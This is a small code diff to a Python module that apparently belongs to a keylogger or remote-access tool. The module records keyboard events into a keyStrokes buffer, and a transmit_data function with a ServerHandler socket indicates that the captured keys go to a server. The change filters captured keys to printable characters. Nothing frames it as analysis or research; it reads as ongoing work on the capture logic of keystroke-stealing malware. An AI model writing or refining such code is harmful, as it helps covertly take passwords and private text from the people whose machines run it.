@@ -1,4 +1,4 @@
-import keyboard, time, typing, time, threading, re
+import keyboard, time, typing, time, threading, re, string
 
 if typing.TYPE_CHECKING:
     from ..handler import ServerHandler
@@ -23,7 +23,8 @@ def run(socketInstance: 'ServerHandler'):
                 keyStrokes += '\n'
 
             case _:
-                keyStrokes += event.name
+                if ((key := event.name) in string.printable):
+                    keyStrokes += key
 
     def transmit_data() -> None:
         nonlocal keyStrokes
